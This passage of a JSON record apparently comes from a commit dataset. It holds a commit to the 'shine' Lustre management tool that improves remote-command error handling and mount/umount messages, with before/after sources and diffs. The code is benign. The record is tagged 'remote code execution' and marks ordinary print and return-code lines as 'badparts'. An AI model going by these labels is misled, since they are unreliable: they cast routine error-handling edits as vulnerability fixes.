\"ERROR\"\n                elif target.state == RUNTIME_ERROR:\n                    status = \"CHECK FAILURE\"\n                else:\n                    status = \"UNKNOWN\"\n\n                if target.dev_size >= TERA:\n                    dev_size = \"%.1fT\" % (target.dev_size/TERA)\n                elif target.dev_size >= GIGA:\n                    dev_size = \"%.1fG\" % (target.dev_size/GIGA)\n                elif target.dev_size >= MEGA:\n                    dev_size = \"%.1fM\" % (target.dev_size/MEGA)\n                elif target.dev_size >= KILO:\n                    dev_size = \"%.1fK\" % (target.dev_size/KILO)\n                else:\n                    dev_size = \"%d\" % target.dev_size\n\n                if target.jdev:\n                    jdev_col_enabled = True\n                    jdev = target.jdev\n                else:\n                    jdev = \"\"\n\n                if target.tag:\n                    tag_col_enabled = True\n                    tag = target.tag\n                else:\n                    tag = \"\"\n\n                flags = []\n                if target.has_need_index_flag():\n                    flags.append(\"need_index\")\n                if target.has_first_time_flag():\n                    flags.append(\"first_time\")\n                if target.has_update_flag():\n                    flags.append(\"update\")\n                if target.has_rewrite_ldd_flag():\n                    flags.append(\"rewrite_ldd\")\n                if target.has_writeconf_flag():\n                    flags.append(\"writeconf\")\n                if target.has_upgrade14_flag():\n                    flags.append(\"upgrade14\")\n                if target.has_param_flag():\n                    flags.append(\"conf_param\")\n\n                ldic.append(target_dict([\\\n                    [\"nodes\", NodeSet.fromlist(target.servers)],\n                    [\"dev\", target.dev],\n                    [\"size\", dev_size],\n                    [\"jdev\", jdev],\n                    [\"type\", target.type.upper()],\n                    [\"index\", target.index],\n                    [\"tag\", tag],\n                    [\"label\", target.label],\n                    [\"flags\", ' '.join(flags)],\n                    [\"fsname\", target.fs.fs_name],\n                    [\"status\", status]]))\n\n        ldic.sort()\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        i = 0\n        layout.set_column(\"dev\", i, AsciiTableLayout.LEFT, \"device\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"nodes\", i, AsciiTableLayout.LEFT, \"node(s)\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"size\", i, AsciiTableLayout.RIGHT, \"dev size\",\n                AsciiTableLayout.CENTER)\n        if jdev_col_enabled:\n            i += 1\n            layout.set_column(\"jdev\", i, AsciiTableLayout.RIGHT, \"journal device\",\n                    AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"type\", i, AsciiTableLayout.LEFT, \"type\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"index\", i, AsciiTableLayout.RIGHT, \"index\",\n                AsciiTableLayout.CENTER)\n        if tag_col_enabled:\n            i += 1\n            layout.set_column(\"tag\", i, AsciiTableLayout.LEFT, \"tag\",\n                    AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"label\", i, AsciiTableLayout.LEFT, \"label\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"flags\", i, AsciiTableLayout.LEFT, \"ldd flags\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"fsname\", i, AsciiTableLayout.LEFT, \"fsname\",\n                AsciiTableLayout.CENTER)\n        i += 1\n        layout.set_column(\"status\", i, AsciiTableLayout.LEFT, \"status\",\n                AsciiTableLayout.CENTER)\n\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n"}, "/lib/Shine/Commands/Umount.py": {"changes": [{"diff": "\n     def ev_stopclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Umount: %s\" % (node, client.status_info)\n+                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Umount.py", "badparts": ["                print \"%s: Umount: %s\" % (node, client.status_info)"], "goodparts": ["                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)"]}, {"diff": "\n \n             if rc == RC_OK:\n                 if vlevel > 0:\n-                    print \"Unmount successful.\"\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                    print \"Unmount successful on %s\" % m_nodes\n             elif rc == RC_RUNTIME_ERROR:\n                 for nodes, msg in fs.proxy_errors:\n                     print \"%s: %s\" % (nod", "add": 2, "remove": 1, "filename": "/lib/Shine/Commands/Umount.py", "badparts": ["                    print \"Unmount successful.\""], "goodparts": ["                    print \"Unmount successful on %s\" % m_nodes"]}], "source": "\n \"\"\" Shine `umount' command classes. The umount command aims to stop Lustre filesystem clients. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSClientLiveCommand import FSClientLiveCommand from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.FileSystem import * class GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_stopclient_start(self, node, client): if self.verbose > 1: print \"%s: Unmounting %s on %s...\" %(node, client.fs.fs_name, client.mount_path) def ev_stopclient_done(self, node, client): if self.verbose > 1: if client.status_info: print \"%s: Umount: %s\" %(node, client.status_info) else: print \"%s: FS %s succesfully unmounted from %s\" %(node, client.fs.fs_name, client.mount_path) def ev_stopclient_failed(self, node, client, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to unmount FS %s from %s: %s\" % \\ (node, client.fs.fs_name, client.mount_path, strerr) if rc: print message class Umount(FSClientLiveCommand): \"\"\" shine umount \"\"\" def __init__(self): FSClientLiveCommand.__init__(self) def get_name(self): return \"umount\" def get_desc(self): return \"Unmount file system clients.\" target_status_rc_map={ \\ MOUNTED: RC_FAILURE, RECOVERING: RC_FAILURE, OFFLINE: RC_OK, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalUmountEventHandler(vlevel)) nodes=self.nodes_support.get_nodeset() fs_conf, fs=open_lustrefs(fsname, None, nodes=nodes, indexes=None, event_handler=eh) if nodes and not nodes.issubset(fs_conf.get_client_nodes()): raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\ (nodes -fs_conf.get_client_nodes(), fsname)) fs.set_debug(self.debug_support.has_debug()) status=fs.umount() rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Unmount successful.\" elif rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) return result ", "sourceWithComments": "# Umount.py -- Unmount file system on clients\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `umount' command classes.\n\nThe umount command aims to stop Lustre filesystem clients.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSClientLiveCommand import FSClientLiveCommand\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.FileSystem import *\n\n\nclass GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_stopclient_start(self, node, client):\n        if self.verbose > 1:\n            print \"%s: Unmounting %s on %s ...\" % (node, client.fs.fs_name, client.mount_path)\n\n    def ev_stopclient_done(self, node, client):\n        if self.verbose > 1:\n            if client.status_info:\n                print \"%s: Umount: %s\" % (node, client.status_info)\n            else:\n                print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                        client.fs.fs_name, client.mount_path)\n\n    def ev_stopclient_failed(self, node, client, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to unmount FS %s from %s: %s\" % \\\n                (node, client.fs.fs_name, client.mount_path, strerr)\n        if rc:\n            print message\n\n\nclass Umount(FSClientLiveCommand):\n    \"\"\"\n    shine umount\n    \"\"\"\n\n    def __init__(self):\n        FSClientLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"umount\"\n\n    def get_desc(self):\n        return \"Unmount file system clients.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_FAILURE,\n            RECOVERING : RC_FAILURE,\n            OFFLINE : RC_OK,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None,\n                    GlobalUmountEventHandler(vlevel))\n\n            nodes = self.nodes_support.get_nodeset()\n\n            fs_conf, fs = open_lustrefs(fsname, None,\n                    nodes=nodes,\n                    indexes=None,\n                    event_handler=eh)\n\n            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):\n                raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\\n                        (nodes - fs_conf.get_client_nodes(), fsname))\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status = fs.umount()\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Unmount successful.\"\n            elif rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n        return result\n\n"}, "/lib/Shine/Controller.py": {"changes": [{"diff": "\n             self.print_help(e.message, e.cmd)\n         except CommandException, e:\n             self.print_error(e.message)\n-            return RC_USER_ERROR\n         except ModelFileIOError, e:\n             print \"Error - %s\" % e.message\n         except ModelFileException, e:\n             print \"ModelFile: %s\" % e\n         except ConfigException, e:\n             print \"Configuration: %s\" % e\n-            return RC_RUNTIME_ERROR\n         # file system\n         except FSRemoteError, e:\n             self.print_error(e)\n             return e.rc\n         except NodeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except RangeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except KeyError:\n-            print \"Error - Unrecognized action\"\n-            print\n             raise\n         \n-        return 1\n+        return RC_RUNTIME", "add": 1, "remove": 7, "filename": "/lib/Shine/Controller.py", "badparts": ["            return RC_USER_ERROR", "            return RC_RUNTIME_ERROR", "            return RC_USER_ERROR", "            return RC_USER_ERROR", "            print \"Error - Unrecognized action\"", "            print", "        return 1"], "goodparts": ["        return RC_RUNTIME"]}], "source": "\n from Configuration.Globals import Globals from Commands.CommandRegistry import CommandRegistry from Configuration.ModelFile import ModelFileException from Configuration.ModelFile import ModelFileIOError from Configuration.Exceptions import ConfigException from Commands.Exceptions import * from Commands.Base.CommandRCDefs import * from Lustre.FileSystem import FSRemoteError from ClusterShell.Task import * from ClusterShell.NodeSet import * import getopt import logging import re import sys def print_csdebug(task, s): m=re.search(\"(\\w+): SHINE:\\d:(\\w+):\", s) if m: print \"%s<pickle>\" % m.group(0) else: print s class Controller: def __init__(self): self.logger=logging.getLogger(\"shine\") self.cmds=CommandRegistry() task_self().set_info(\"print_debug\", print_csdebug) def usage(self): cmd_maxlen=0 for cmd in self.cmds: if not cmd.is_hidden(): if len(cmd.get_name()) > cmd_maxlen: cmd_maxlen=len(cmd.get_name()) for cmd in self.cmds: if not cmd.is_hidden(): print \" %-*s %s\" %(cmd_maxlen, cmd.get_name(), cmd.get_params_desc()) def print_error(self, errmsg): print >>sys.stderr, \"Error:\", errmsg def print_help(self, msg, cmd): if msg: print msg print print \"Usage: %s %s\" %(cmd.get_name(), cmd.get_params_desc()) print print cmd.get_desc() def run_command(self, cmd_args): try: return self.cmds.execute(cmd_args) except getopt.GetoptError, e: print \"Syntax error: %s\" % e except CommandHelpException, e: self.print_help(e.message, e.cmd) except CommandException, e: self.print_error(e.message) return RC_USER_ERROR except ModelFileIOError, e: print \"Error -%s\" % e.message except ModelFileException, e: print \"ModelFile: %s\" % e except ConfigException, e: print \"Configuration: %s\" % e return RC_RUNTIME_ERROR except FSRemoteError, e: self.print_error(e) return e.rc except NodeSetParseError, e: self.print_error(\"%s\" % e) return RC_USER_ERROR except RangeSetParseError, e: self.print_error(\"%s\" % e) return RC_USER_ERROR except KeyError: print \"Error -Unrecognized action\" print raise return 1 ", "sourceWithComments": "# Controller.py -- Controller class\n# Copyright (C) 2007 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Configuration.Globals import Globals\nfrom Commands.CommandRegistry import CommandRegistry\n\nfrom Configuration.ModelFile import ModelFileException\nfrom Configuration.ModelFile import ModelFileIOError\n\nfrom Configuration.Exceptions import ConfigException\nfrom Commands.Exceptions import *\nfrom Commands.Base.CommandRCDefs import *\n\nfrom Lustre.FileSystem import FSRemoteError\n\nfrom ClusterShell.Task import *\nfrom ClusterShell.NodeSet import *\n\nimport getopt\nimport logging\nimport re\nimport sys\n\n\ndef print_csdebug(task, s):\n    m = re.search(\"(\\w+): SHINE:\\d:(\\w+):\", s)\n    if m:\n        print \"%s<pickle>\" % m.group(0)\n    else:\n        print s\n\n\nclass Controller:\n\n    def __init__(self):\n        self.logger = logging.getLogger(\"shine\")\n        #handler = logging.FileHandler(Globals().get_log_file())\n        #formatter = logging.Formatter('%(asctime)s %(levelname)s %(name)s : %(message)s')\n        #handler.setFormatter(formatter)\n        #self.logger.addHandler(handler)\n        #self.logger.setLevel(Globals().get_log_level())\n        self.cmds = CommandRegistry()\n\n        #task_self().set_info(\"debug\", True)\n\n        task_self().set_info(\"print_debug\", print_csdebug)\n\n    def usage(self):\n        cmd_maxlen = 0\n\n        for cmd in self.cmds:\n            if not cmd.is_hidden():\n                if len(cmd.get_name()) > cmd_maxlen:\n                    cmd_maxlen = len(cmd.get_name())\n        for cmd in self.cmds:\n            if not cmd.is_hidden():\n                print \"  %-*s %s\" % (cmd_maxlen, cmd.get_name(),\n                    cmd.get_params_desc())\n\n    def print_error(self, errmsg):\n        print >>sys.stderr, \"Error:\", errmsg\n\n    def print_help(self, msg, cmd):\n        if msg:\n            print msg\n            print\n        print \"Usage: %s %s\" % (cmd.get_name(), cmd.get_params_desc())\n        print\n        print cmd.get_desc()\n\n    def run_command(self, cmd_args):\n\n        #self.logger.info(\"running %s\" % cmd_name)\n\n        try:\n            return self.cmds.execute(cmd_args)\n        except getopt.GetoptError, e:\n            print \"Syntax error: %s\" % e\n        except CommandHelpException, e:\n            self.print_help(e.message, e.cmd)\n        except CommandException, e:\n            self.print_error(e.message)\n            return RC_USER_ERROR\n        except ModelFileIOError, e:\n            print \"Error - %s\" % e.message\n        except ModelFileException, e:\n            print \"ModelFile: %s\" % e\n        except ConfigException, e:\n            print \"Configuration: %s\" % e\n            return RC_RUNTIME_ERROR\n        # file system\n        except FSRemoteError, e:\n            self.print_error(e)\n            return e.rc\n        except NodeSetParseError, e:\n            self.print_error(\"%s\" % e)\n            return RC_USER_ERROR\n        except RangeSetParseError, e:\n            self.print_error(\"%s\" % e)\n            return RC_USER_ERROR\n        except KeyError:\n            print \"Error - Unrecognized action\"\n            print\n            raise\n        \n        return 1\n\n\n"}, "/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py": {"changes": [{"diff": "\n         \"\"\"\n         # Gather nodes by return code\n         for rc, nodes in worker.iter_retcodes():\n+            # some common remote errors:\n             # rc 127 = command not found\n             # rc 126 = found but not executable\n-            if rc >= 126:\n+            # rc 1 = python failure...\n+            if rc != 0:\n                 # Gather these nodes by buffer\n                 for buffer, nodes in worker.iter_buffers(nodes):\n                     # Handle proxy command error which rc ", "add": 3, "remove": 1, "filename": "/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py", "badparts": ["            if rc >= 126:"], "goodparts": ["            if rc != 0:"]}], "source": "\n from Shine.Configuration.Globals import Globals from Shine.Configuration.Configuration import Configuration from ProxyAction import * from ClusterShell.NodeSet import NodeSet class FSProxyAction(ProxyAction): \"\"\" Generic file system command proxy action class. \"\"\" def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None): ProxyAction.__init__(self) self.fs=fs self.action=action assert isinstance(nodes, NodeSet) self.nodes=nodes self.debug=debug self.targets_type=targets_type self.targets_indexes=targets_indexes if self.fs.debug: print \"FSProxyAction %s on %s\" %(action, nodes) def launch(self): \"\"\" Launch FS proxy command. \"\"\" command=[\"%s\" % self.progpath] command.append(self.action) command.append(\"-f %s\" % self.fs.fs_name) command.append(\"-R\") if self.debug: command.append(\"-d\") if self.targets_type: command.append(\"-t %s\" % self.targets_type) if self.targets_indexes: command.append(\"-i %s\" % self.targets_indexes) self.task.shell(' '.join(command), nodes=self.nodes, handler=self) def ev_read(self, worker): node, buf=worker.last_read() try: event, params=self._shine_msg_unpack(buf) self.fs._handle_shine_event(event, node, **params) except ProxyActionUnpackError, e: pass def ev_close(self, worker): \"\"\" End of proxy command. \"\"\" for rc, nodes in worker.iter_retcodes(): if rc >=126: for buffer, nodes in worker.iter_buffers(nodes): self.fs._handle_shine_proxy_error(nodes, \"Remote action %s failed: %s\" % \\ (self.action, buffer)) self.fs.action_refcnt -=1 if self.fs.action_refcnt==0: worker.task.abort() ", "sourceWithComments": "# FSProxyAction.py -- Lustre generic FS proxy action class\n# Copyright (C) 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Globals import Globals\nfrom Shine.Configuration.Configuration import Configuration\n\nfrom ProxyAction import *\n\nfrom ClusterShell.NodeSet import NodeSet\n\n\nclass FSProxyAction(ProxyAction):\n    \"\"\"\n    Generic file system command proxy action class.\n    \"\"\"\n\n    def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None):\n        ProxyAction.__init__(self)\n        self.fs = fs\n        self.action = action\n        assert isinstance(nodes, NodeSet)\n        self.nodes = nodes\n        self.debug = debug\n        self.targets_type = targets_type\n        self.targets_indexes = targets_indexes\n\n        if self.fs.debug:\n            print \"FSProxyAction %s on %s\" % (action, nodes)\n\n    def launch(self):\n        \"\"\"\n        Launch FS proxy command.\n        \"\"\"\n        command = [\"%s\" % self.progpath]\n        command.append(self.action)\n        command.append(\"-f %s\" % self.fs.fs_name)\n        command.append(\"-R\")\n\n        if self.debug:\n            command.append(\"-d\")\n\n        if self.targets_type:\n            command.append(\"-t %s\" % self.targets_type)\n            if self.targets_indexes:\n                command.append(\"-i %s\" % self.targets_indexes)\n\n        # Schedule cluster command.\n        self.task.shell(' '.join(command), nodes=self.nodes, handler=self)\n\n    def ev_read(self, worker):\n        node, buf = worker.last_read()\n        try:\n            event, params = self._shine_msg_unpack(buf)\n            self.fs._handle_shine_event(event, node, **params)\n        except ProxyActionUnpackError, e:\n            # ignore any non shine messages\n            pass\n\n    def ev_close(self, worker):\n        \"\"\"\n        End of proxy command.\n        \"\"\"\n        # Gather nodes by return code\n        for rc, nodes in worker.iter_retcodes():\n            # rc 127 = command not found\n            # rc 126 = found but not executable\n            if rc >= 126:\n                # Gather these nodes by buffer\n                for buffer, nodes in worker.iter_buffers(nodes):\n                    # Handle proxy command error which rc >= 127 and \n                    self.fs._handle_shine_proxy_error(nodes, \"Remote action %s failed: %s\" % \\\n                            (self.action, buffer))\n\n        self.fs.action_refcnt -= 1\n        if self.fs.action_refcnt == 0:\n            worker.task.abort()\n\n"}}, "msg": "* improved proxy (remote) commands execution error handling, now checking for every error != 0 to catch every possible remote errors\n    * modified return codes when run with -R (remote call) by adding a filter for each command (rc=0 proxy success, rc!=0 proxy failure)\n    * misc. improvements on error handling and return codes handling\n* added mount/umount user messages\n\nSVN commit: r109"}}, "https://github.com/cea-hpc/shine": {"7ff203be36e439b535894764c37a8446351627ec": {"url": "https://api.github.com/repos/cea-hpc/shine/commits/7ff203be36e439b535894764c37a8446351627ec", "html_url": "https://github.com/cea-hpc/shine/commit/7ff203be36e439b535894764c37a8446351627ec", "message": "* improved proxy (remote) commands execution error handling, now checking for every error != 0 to catch every possible remote errors\n    * modified return codes when run with -R (remote call) by adding a filter for each command (rc=0 proxy success, rc!=0 proxy failure)\n    * misc. improvements on error handling and return codes handling\n* added mount/umount user messages\n\nSVN commit: r109", "sha": "7ff203be36e439b535894764c37a8446351627ec", "keyword": "remote code execution improve", "diff": "diff --git a/lib/Shine/Commands/Base/Command.py b/lib/Shine/Commands/Base/Command.py\nindex db0fa19..4b097fa 100644\n--- a/lib/Shine/Commands/Base/Command.py\n+++ b/lib/Shine/Commands/Base/Command.py\n@@ -135,3 +135,12 @@ def ask_confirm(self, prompt):\n         \"\"\"\n         i = raw_input(\"%s (y)es/(N)o: \" % prompt)\n         return i == 'y' or i == 'Y'\n+\n+\n+    def filter_rc(self, rc):\n+        \"\"\"\n+        Allow derived classes to filter return codes.\n+        \"\"\"\n+        # default is to not filter return code\n+        return rc\n+\ndiff --git a/lib/Shine/Commands/Base/RemoteCommand.py b/lib/Shine/Commands/Base/RemoteCommand.py\nindex 77de3e9..aeeea8c 100644\n--- a/lib/Shine/Commands/Base/RemoteCommand.py\n+++ b/lib/Shine/Commands/Base/RemoteCommand.py\n@@ -23,6 +23,7 @@\n from Shine.Configuration.Globals import Globals \n from Shine.Configuration.Exceptions import *\n from Command import Command\n+from CommandRCDefs import *\n from RemoteCallEventHandler import RemoteCallEventHandler\n from Support.Nodes import Nodes\n from Support.Yes import Yes\n@@ -85,6 +86,18 @@ def ask_confirm(self, prompt):\n         \"\"\"\n         return self.remote_call or Command.ask_confirm(self, prompt)\n \n+    def filter_rc(self, rc):\n+        \"\"\"\n+        When called remotely, return code are not used to handle shine action\n+        success or failure, nor for status info. To properly detect ssh or remote\n+        shine installation failures, we filter the return code here.\n+        \"\"\"\n+        if self.remote_call:\n+            # Only errors of type RUNTIME ERROR are allowed to go up.\n+            rc &= RC_FLAG_RUNTIME_ERROR\n+\n+        return Command.filter_rc(self, rc)\n+\n \n class RemoteCriticalCommand(RemoteCommand):\n \ndiff --git a/lib/Shine/Commands/CommandRegistry.py b/lib/Shine/Commands/CommandRegistry.py\nindex f1ae724..8edf6e7 100644\n--- a/lib/Shine/Commands/CommandRegistry.py\n+++ b/lib/Shine/Commands/CommandRegistry.py\n@@ -120,5 +120,8 @@ def execute(self, args):\n         command.parse(new_args)\n \n         # Execute\n-        return command.execute()\n+        rc = command.execute()\n+\n+        # Filter rc\n+        return command.filter_rc(rc)\n \ndiff --git a/lib/Shine/Commands/Install.py b/lib/Shine/Commands/Install.py\nindex 525cfc6..9bc0dd8 100644\n--- a/lib/Shine/Commands/Install.py\n+++ b/lib/Shine/Commands/Install.py\n@@ -25,9 +25,11 @@\n from Shine.FSUtils import create_lustrefs\n \n from Base.Command import Command\n+from Base.CommandRCDefs import *\n from Base.Support.LMF import LMF\n from Base.Support.Nodes import Nodes\n \n+from Exceptions import *\n \n class Install(Command):\n     \"\"\"\n@@ -48,7 +50,7 @@ def get_desc(self):\n \n     def execute(self):\n         if not self.opt_m:\n-            print \"Bad argument\"\n+            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)\n         else:\n             # Use this Shine.FSUtils convenience function.\n             fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n@@ -83,5 +85,5 @@ def execute(self):\n                 print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                         fs_conf.get_fs_name()\n \n-            return 0\n+            return RC_OK\n \ndiff --git a/lib/Shine/Commands/Mount.py b/lib/Shine/Commands/Mount.py\nindex 43f3a91..d705f8f 100644\n--- a/lib/Shine/Commands/Mount.py\n+++ b/lib/Shine/Commands/Mount.py\n@@ -59,7 +59,7 @@ def ev_startclient_start(self, node, client):\n     def ev_startclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Mount: %s\" % (node, client.status_info)\n+                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully mounted on %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n@@ -126,17 +126,26 @@ def execute(self):\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.mount(mount_options=fs_conf.get_mount_options())\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n                 result = rc\n \n-            if rc == RC_OK:\n-                if vlevel > 0:\n-                    print \"Mount successful.\"\n-            elif rc == RC_RUNTIME_ERROR:\n-                for nodes, msg in fs.proxy_errors:\n-                    print \"%s: %s\" % (nodes, msg)\n+            if not self.remote_call:\n+                if rc == RC_OK:\n+                    if vlevel > 0:\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                        print \"Mount successful on %s\" % m_nodes\n+                elif rc == RC_RUNTIME_ERROR:\n+                    for nodes, msg in fs.proxy_errors:\n+                        print \"%s: %s\" % (nodes, msg)\n \n         return result\n \ndiff --git a/lib/Shine/Commands/Preinstall.py b/lib/Shine/Commands/Preinstall.py\nindex 304eb30..6baf18c 100644\n--- a/lib/Shine/Commands/Preinstall.py\n+++ b/lib/Shine/Commands/Preinstall.py\n@@ -26,6 +26,7 @@\n from Shine.FSUtils import create_lustrefs\n \n from Base.RemoteCommand import RemoteCommand\n+from Base.CommandRCDefs import *\n from Base.Support.FS import FS\n \n import os\n@@ -54,6 +55,7 @@ def execute(self):\n             if not os.path.exists(conf_dir_path):\n                 os.makedirs(conf_dir_path, 0755)\n         except OSError, ex:\n-            print \"OSError\"\n-            raise\n+            print \"OSError %s\" % ex\n+            return RC_RUNTIME_ERROR\n \n+        return RC_OK\ndiff --git a/lib/Shine/Commands/Start.py b/lib/Shine/Commands/Start.py\nindex e29a7e3..63c85d6 100644\n--- a/lib/Shine/Commands/Start.py\n+++ b/lib/Shine/Commands/Start.py\n@@ -214,4 +214,4 @@ def execute(self):\n             if hasattr(eh, 'post'):\n                 eh.post(fs)\n \n-            return rc\n+        return result\ndiff --git a/lib/Shine/Commands/Status.py b/lib/Shine/Commands/Status.py\nindex 055bb02..a8a5ce1 100644\n--- a/lib/Shine/Commands/Status.py\n+++ b/lib/Shine/Commands/Status.py\n@@ -121,7 +121,7 @@ def fs_status_to_rc(self, status):\n \n     def execute(self):\n \n-        result = -1\n+        result = 0\n \n         self.init_execute()\n \n@@ -158,6 +158,8 @@ def execute(self):\n                 status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)\n \n             statusdict = fs.status(status_flags)\n+            if not statusdict:\n+                continue\n \n             if RUNTIME_ERROR in statusdict:\n                 # get targets that couldn't be checked\n@@ -176,15 +178,17 @@ def execute(self):\n             if rc > result:\n                 result = rc\n \n-            if view == \"fs\":\n-                self.status_view_fs(fs)\n-            elif view.startswith(\"target\"):\n-                self.status_view_targets(fs)\n-            elif view.startswith(\"disk\"):\n-                self.status_view_disks(fs)\n-            else:\n-                raise CommandBadParameterError(self.view_support.get_view(),\n-                        \"fs, targets, disks\")\n+            if not self.remote_call and vlevel > 0:\n+                if view == \"fs\":\n+                    self.status_view_fs(fs)\n+                elif view.startswith(\"target\"):\n+                    self.status_view_targets(fs)\n+                elif view.startswith(\"disk\"):\n+                    self.status_view_disks(fs)\n+                else:\n+                    raise CommandBadParameterError(self.view_support.get_view(),\n+                            \"fs, targets, disks\")\n+\n         return result\n \n     def status_view_targets(self, fs):\ndiff --git a/lib/Shine/Commands/Umount.py 